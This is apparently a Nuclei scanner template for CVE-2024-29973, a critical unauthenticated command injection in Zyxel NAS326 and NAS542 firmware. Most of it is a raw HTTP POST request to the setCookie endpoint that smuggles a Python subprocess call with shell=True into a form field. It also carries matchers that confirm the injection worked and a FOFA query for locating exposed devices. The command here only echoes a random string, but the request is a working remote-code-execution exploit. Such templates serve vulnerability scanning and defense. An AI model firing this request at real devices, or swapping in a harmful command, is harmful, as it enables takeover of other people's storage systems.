http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - 'contains(body, ''errmsg0": "OK'')'
    - contains(header, 'application/json')
    - contains(body, '{{string}}')
    type: dsl
  raw:
  - 'POST /cmd,/simZysh/register_main/setCookie HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei


    ------WebKitFormBoundarygcflwtei

    Content-Disposition: form-data; name="c0"


    storage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("echo
    {{string}}", shell=True)#

    ------WebKitFormBoundarygcflwtei--

    '
id: CVE-2024-29973
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:o:zyxel:nas326_firmware:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-29973
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.88
    cwe-id: CWE-78
    epss-percentile: 0.9971
    epss-score: 0.96901
  description: "The command injection vulnerability in the \u201CsetCookie\u201D parameter\
    \ in Zyxel NAS326 firmware versions before V5.21(AAZF.17)C0 and NAS542 firmware\
    \ versions before V5.21(ABAG.14)C0 could allow an unauthenticated attacker to\
    \ execute some operating system (OS) commands by sending a crafted HTTP POST request.\n"
  metadata:
    fofa-query: app="ZYXEL-NAS326"
    max-request: 1
    product: nas326_firmware
    vendor: zyxel
    verified: true
  name: Zyxel NAS326 Firmware < V5.21(AAZF.17)C0 - Command Injection
  reference:
  - https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/
  - https://x.com/sirifu4k1/status/1803267896656929099/photo/1
  - https://nvd.nist.gov/vuln/detail/CVE-2024-29973
  severity: critical
  tags: cve,cve2024,zyxel,rce,intrusive
variables:
  string: '{{randstr}}'
